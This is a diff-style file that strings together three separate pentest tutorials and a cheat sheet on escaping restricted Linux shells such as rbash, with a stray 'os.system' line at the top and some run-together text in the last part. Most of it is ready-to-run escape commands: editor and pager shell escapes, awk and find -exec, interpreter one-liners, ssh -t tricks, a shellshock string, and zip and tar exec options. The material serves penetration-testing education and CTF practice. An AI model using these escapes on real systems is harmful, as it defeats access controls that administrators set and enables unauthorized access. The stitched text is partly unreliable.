@@ -1,0 +1,330 @@
+﻿
+echo os.system(‘/bin/bash’)
+
+
+
+[Editor's Note: On the GPWN mailing list for SANS Pen Test Course Alumni a few months ago, we had a nice, lively discussion about techniques penetration testers and ethical hackers could use to escape a restricted shell environment. A lot of nifty techniques were offered in what amounted to an interactive brainstorming session on the list. Doug Stilwell offered to write an article based on the discussion and his own experience. I really like what he's come up with, and I think it'll be a handy reference for folks who find themselves facing a restricted shell in a pen test and need to get deeper access into the target system. Thanks for the cool article, Doug! -Ed.]
+Introduction
+
+Last year I was approached by a systems engineer and he offered me a steak dinner if I could escape the restricted shell he had set up on a Linux server. The restricted shell was being created due to a request from the development group needing access to certain servers for troubleshooting, and he wanted to restrict what they could do. I don't know about most of you, but a challenge alone from one of my colleagues is more than enough to get me going, but a steak dinner? Where do I sign?! The only thing better would have been a case of beer! I wasn't very familiar with restricted shells so off to Google I went for some assistance. It didn't take long before I noticed there was a lack of information on the topic. Information was scattered and most resources were not very descriptive. In addition to internet research, I also consulted the SANS GPWN e-mail distribution list to see if anybody had any cool tricks. It turns out, they did, but the consensus was that they'd like to see an article published covering this topic.
+Scope
+
+The purpose of this article is to create a better resource for penetration testers to assist them when confronted with a restricted shell. In no way will this be an exhaustive account of all techniques, but instead, I'm going to cite several of the most applicable and effective techniques in this handy reference document. This article is not going to cover defending restricted shell attacks, focus on specific flavors of Linux, nor is it going to cover every restricted shell since they can be configured many ways. Therefore, command line syntax may differ depending on the version of Linux you're familiar with. I will focus mainly on the techniques themselves. Of course, if you find a way to exploit a running process to escalate your privileges, then there is no need to escape the shell.
+A Restricted Shell... What Is It?
+
+It limits a user's ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:
+
+    Using the 'cd' command to change directories.
+    Setting or unsetting certain environment variables (i.e. SHELL, PATH, etc...).
+    Specifying command names that contain slashes.
+    Specifying a filename containing a slash as an argument to the '.' built-in command.
+    Specifying a filename containing a slash as an argument to the '-p' option to the 'hash' built-in command.
+    Importing function definitions from the shell environment at startup.
+    Parsing the value of SHELLOPTS from the shell environment at startup.
+    Redirecting output using the '>', '>|', ", '>&', '&>', and '>>' redirection operators.
+    Using the '-exec' built-in to replace the shell with another command.
+    Adding or deleting built-in commands with the '-f' and '-d' options to the enable built-in.
+    Using the 'enable' built-in command to enable disabled shell built-ins.
+    Specifying the '-p' option to the 'command' built-in.
+    Turning off restricted mode with 'set +r' or 'set +o restricted'.
+
+Since business needs override security a good portion of the time, it's possible that some of the above restrictions are relaxed. So do not assume that these restrictions are set in stone. I suggest you QC the quality of the restricted shell.
+Reconnaissance
+
+The first step should be to gather a little information. You'll need to know your environment. Run the 'env' command to understand how your profile is configured. You'll see which shell you're running and where your PATH is pointing to. Once you know what your PATH is, list the contents of the directory (i.e. 'ls /usr/local/rbin') to see which commands are present. It is possible you may not be able to run the 'ls' command. If not, you can use the 'echo' command with an asterisk to 'glob' directory contents if it's available:
+
+echo /usr/local/rbin/*
+
+You can continue on through the file system using this command to help you find other files and commands. Basically, you'll be armed with built-in shell commands as well as the ones listed in your PATH. This is your arsenal for attacking the restricted shell, but there may be exceptions as we'll find out. Once you know which commands you can execute, research each one of them to see if there are known shell escapes associated with them. Some of the techniques we're about to get into can be combined together.
+Change PATH or SHELL Environment Variables
+
+Type 'export -p' to see the exported variables in the shell. What this will also show you is which variables are read-only. You'll note that most likely the PATH and SHELL variables are '-rx', which means you execute them, but not write to them. If they are writeable, then you can start giggling now as you'll be able to escape the restricted shell in no time! If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc...). If the PATH is writeable, then you'll be able to set it to any directory you want. I recommend setting it to one that has commands vulnerable to shell escapes.
+Copying Files
+
+If you're able to copy files into your PATH, then you'll be able to bypass the forward slash restriction. The sky is the limit at this point as you can copy commands into the PATH that have known shell escapes. You can also write your own script, copy it to the PATH, and execute it.
+
+Another technique is to try and copy files to your home directory and execute them from there. Execution will be difficult as you will have to use './' in order to get it to run, and as we already know, it will fail since the restricted shell will not allow the use of a forward slash. Keep in mind, you may be able to get the commands you copy to your home directory to run if you're able to couple it with another command that has a shell escape.
+
+Other ways you may be able to copy files or get access to them include mounting a device or file system. You may also be able to copy them to your system using a program that can copy files such as SCP or FTP.
+
+Try to find directories other than your PATH where you can execute commands from. If you have write access to them, you can copy commands here and may be able to execute them.
+
+Lastly, consider creating a symbolic link in a directory where you have write access and the ability to run commands
+Editors
+
+One of the most well documented techniques is to spawn a shell from within an editor such as 'vi' or 'vim'. Open any file using one of these editors and type the following and execute it from within the editor:
+
+:set shell=/bin/bash
+
+Next, type and execute:
+
+:shell
+
+Another method is to type:
+
+:! /bin/bash
+
+If either of these works, you will have an unrestricted shell from within the editor. Most modern restricted shells already defend against this hack, but it's always worth a shot. You may be working from a restricted editor such as rvi or rvim, which will almost certainly stop a shell from spawning. Also, try different shells with this technique and ones that follow as some restricted shells may block 'sh' or 'bash'.
+Awk Command
+
+If you can run 'awk', you can attempt to execute a shell from within it.
+
+Type the following:
+
+awk 'BEGIN {system("/bin/sh")}'
+
+If successful, you'll see an unrestricted shell prompt!
+Find Command
+
+If the 'find' command is present, you can attempt to use the '-exec' function within it.
+
+Type the following:
+
+find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+
+Again, if successful, you'll see a blinking cursor at an unrestricted shell prompt! Note that in the above example, you are able to call the 'awk' command even if it is not present in our PATH. This is important because you are able to bypass the restriction of only being permitted to execute commands in your PATH. You are not limited to the 'awk' command.
+More, Less, and Man Commands
+
+There is a known escape within these commands. After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file:
+
+'! /bin/sh'
+'!/bin/sh'
+'!bash'
+
+Like the shell escape in 'awk' and 'find', if successful, you'll be sitting at an unrestricted shell prompt. Note you can try different shells, and the space after the '!' may not matter.
+Tee Command
+
+If you do not have access to an editor, and would like to create a script, you can make use of the 'tee' command. Since you cannot make use of '>' or '>>', the 'tee' command can help you direct your output when used in tandem with the 'echo' command. This is not a shell escape in of itself, but consider the following:
+
+echo "evil script code" | tee script.sh
+
+You will be able to create a file called script.sh in your home directory and add your script code to the file. Once the file is created, use the 'tee -a' option for all subsequent commands as the '-a' allows you to append to the file rather than overwrite the file.
+
+Favorite Language?
+
+Try invoking a SHELL through your favorite language:
+
+    python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
+    perl -e 'exec "/bin/sh";'
+    perl: exec "/bin/sh";
+    ruby: exec "/bin/sh"
+    lua: os.execute('/bin/sh')
+    irb(main:001:0> exec "/bin/sh"
+
+Most likely, you will not be able to execute any of these, but it's worth a shot in case they're installed.
+Files Executed in Unrestricted Mode?
+
+Some restricted shells will start by running some files in an unrestricted mode before the restricted shell is applied. If your .bash_profile is executed in an unrestricted mode and it's editable, you'll be able to execute code and commands as an unrestricted user.
+Conclusion
+
+This article is far from conclusive on techniques used to escape restricted shells, but hopefully it was informative and helped you learn some new tricks. What I've come to discover is that there are many ways to attack a restricted shell. You truly are only limited by your imagination. I encourage everyone to try these methods and expand on them and develop new techniques!
+
+Earlier, I mentioned a steak dinner was offered to me if I was able to break out of this custom restricted shell created by an engineer. I was successfully able to break out of it using multiple techniques, but when I asked him for the steak dinner, he came up with an excuse on why he wouldn't do it. I'm considering another approach:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Escape Restricted Shell Environments on Linux
+
+    By drd_
+    10/01/2020 3:31 pm
+
+The moment arrives when you finally pop a shell on the web server you've been working on, only you find yourself in a strange environment with limited functionality. Restricted shells are often used as an additional line of defense and can be frustrating for an attacker to stumble upon. But with enough patience and persistence, it is possible to escape these restricted environments.
+What Are Restricted Shells?
+
+Restricted shells are simply shells with restricted permissions, features, or commands. They are primarily used to ensure that users can perform the minimum operations necessary for daily function in a secure, contained environment. Administrators might also use them to make sure they don't enter any dangerous commands accidentally. Sometimes, these restricted shells might even be put in place to dissuade hackers.
+
+    Recommended Book on Amazon: The Linux Command Line, 2nd Edition: A Complete Introduction (Illustrated Edition)
+
+The most common types of restricted shells are just normal shells with certain limitations in place, such as rbash, rksh, and rzsh. Other types can be configured more to suit certain needs and tighten restrictions, like lshell and rssh.
+Environment Recon
+
+The first step to escaping restricted shells is gathering information about the environment. Some of the most basic commands to initially try out are ls, cd, pwd, and echo. Most of the time, if these commands are restricted, an error will show up with the type of restricted shell we are in (most of the time, this is rbash).
+
+Next, try getting a list of available commands by hitting theTab key twice. We can also try listing binaries in /bin, /usr/bin, and /usr/local/bin if ls is available. Alternatively, we can use globbing to list directory contents if echo is available, like:
+
+echo /usr/bin/*
+
+It is also important to check for operators and escape characters such as the following:
+
+> >> < | & ; : ' " `
+
+Also shell execution:
+
+$(whoami)
+${whoami}
+
+We can check for any files with SUID permissions and any commands we can run with sudo that will allow us to escalate privileges. Any programming languages present on the system also have a good chance of letting us break restrictions.
+
+If we can copy files into our path, we can bypass restrictions by using binaries with known escapes or by writing our own script. To get other information about the environment we are in, try commands like env or printenv.
+Method 1Text Editors
+
+The first technique we'll look at to escape restricted shells is through text editors. Most text editors, like vim, vi, nano, pico, ed, etc., can run commands and scripts inside of them. The following commands can be used to potentially spawn a shell:
+
+:!/bin/sh
+:shell
+:set shell=/bin/sh
+
+Make sure to try different shells, too — sh or bash might be blocked, but zsh might not be. A lot of times this is defended against, but it's worth a try since it is such an easy method of exploitation.
+Method 2Pagers
+
+Similar to text editors, pagers can be used to run commands as well. Pagers are simply utilities that control output that is too long to fit on-screen. The most popular of these are less and more. Simply open a file that is too long to be displayed on one page, and try the following commands inside the utility:
+
+!/bin/sh
+!/bin/bash
+!bash
+
+The Linux man command is also prone to this type of escape since it uses less or more as default pagers.
+Method 3Programming Languages
+
+The next method we can use to break out of restricted shells is by abusing any programming languages that are present on the system. Sometimes, if certain operators are blocked, this technique won't work very well, but usually, it can be very effective for escapes. Here are some common ways to spawn a shell.
+
+Python:
+
+import os; os.system("/bin/sh")
+
+PHP:
+
+exec("sh -i");
+
+Perl:
+
+exec "/bin/sh";
+
+Ruby:
+
+exec "/bin/sh"
+
+Lua:
+
+os.execute("/bin/sh")
+
+Of course, other programming languages can have their own ways to execute local commands and spawn shells.
+Method 4Miscellaneous
+
+There are a variety of other methods to escape from restricted shells, but we'll explore some of the more popular ones here.
+
+If the awk command can be run, a shell can be spawned with the following:
+
+awk 'BEGIN {system("/bin/sh")}'
+
+The find command can attempt to spawn a shell with the following command:
+
+find / -name foobar -exec /bin/sh \;
+
+The expect command can spawn a shell using its own spawn function. First drop into expect by typing expect in the terminal. Then, type spawn sh, and finally sh. If successful, we'll now be in an interactive shell.
+
+By using tee, we can create a script in scenarios where text editors aren't available and redirect characters are blocked:
+
+echo "bash -i" | tee script.sh
+
+Older versions of nmap have an interesting feature called interactive mode. It's rare to find this nowadays, but if you do come across it, it's easy to open an interactive shell with the following:
+
+nmap --interactive
+nmap> !sh
+
+Finally, if SSH access is available but drops you into a restricted shell, connecting with the following options can be used to escape:
+
+ssh user@IP -t "bash --noprofile"
+ssh user@IP -t "/bin/sh"
+
+Wrapping Up
+
+In this tutorial, we learned about restricted shells and why they are used to secure environments. We then learned how to enumerate the environment to determine what we do and don't have access to. Next, we covered various techniques to break out of these restricted environments utilizing text editors, pagers, programming languages, and more. Overall, pretty easy, right?
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Linux Restricted Shell BypassBy @n4ckhcker & @h4d3sw0rm
+Contents[ 1 ] Introduction[2 ] Enumeration Linux Environment[3 ] Common Exploitation Techniques[4 ] Programming Languages Techniques[5 ] Advanced Techniques[6 ] Time to Practice
+
+IntroductionHello, so first of all let’s explain what is a restricted shell ? A restricted shell is a shell that block/restricts some of the commands like cd,ls,echo etc or"block" the environment variables like SHELL,PATH,USER. Sometimes a restricted shell can block the commands with / or the redirecting outputs like >,>>. The types of a restricted shell can be : rbash,rksh,rsh. But now why someone want to create a restricted shell ? Let’s say some examples :
+1)To improve Security
+2)To block hackers/pentesters.
+3)Sometimes system administrators create a restricted shell to protect theirselves from dangerous commands.4)For a CTF Challenge. (Root-me/hackthebox/vulnhub).
+
+Enumeration Linux EnvironmentEnumeration is the most important part. We need to enumeration the Linux environmental to check what we can do to bypass the rbash.We need to enumerate :
+1)First we must to check for available commands like cd/ls/echo etc.
+2)We must to check for operators like >,>>,<,|.
+3)We need to check for available programming languages likeperl,ruby,python etc.
+4)Which commands we can run as root (sudo -l).
+5)Check for files or commands with SUID perm.
+6)You must to check in what shell you are : echo $SHELL you will be inrbash by 90%
+7)Check for the Environmental Variables : run env or printenvNow let’s move into Common Exploitation Techniques.
+
+Common Exploitation TechniquesNow let’s see some of the common exploitation techniques.
+1)If "/" is allowed you can run /bin/sh or /bin/bash.
+2)If you can run cp command you can copy the /bin/sh or /bin/bashinto your directory.
+3)From ftp > !/bin/sh or !/bin/bash
+4)From gdb > !/bin/sh or !/bin/bash
+5)From more/man/less >!/bin/sh or !/bin/bash
+6)From vim > !/bin/sh or !/bin/bash
+7)From rvim > :python import os; os.system("/bin/bash )
+8)From scp > scp -S /path/yourscript x y:
+9)From awk > awk 'BEGIN {system("/bin/sh or /bin/bash")}'
+10)From find > find / -name test -exec /bin/shor /bin/bash \;
+
+Programming Languages TechniquesNow.. let’s look some programming languages techniques.
+1)From except > except spawn sh then sh.
+2)From python > python -c 'import os; os.system("/bin/sh")'
+3)From php > php -a then exec("sh -i");
+4)From perl > perl -e 'exec "/bin/sh";'
+5)From lua > os.execute('/bin/sh').
+6)From ruby > exec "/bin/sh"Now let’s move into Advance Techniques.
+
+Advanced TechniquesNow let's move into some dirty advance techniques.
+1)From ssh > ssh username@IP -t "/bin/sh" or "/bin/bash"
+2)From ssh2 > ssh username@IP -t "bash --noprofile"
+3)From ssh3 > ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
+4)From ssh4 > ssh -o ProxyCommand="sh -c /tmp/yourfile.sh"127.0.0.1 (SUID)
+5)From git > git help status > you can run it then !/bin/bash
+6)From pico > pico -s "/bin/bash" then you can write /bin/bash andthen CTRL + T
+7)From zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c/bin/bash"
+8)From tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bashC SETUID SHELL :
+
+Time For PractiseRoot-me have a INSANE rbash bypass challenge!https://www.root-me.org/en/Challenges/App-Script/Restricted-shellsHackthebox solidstate machine! (Easy)https://www.hackthebox.eu/
+
+
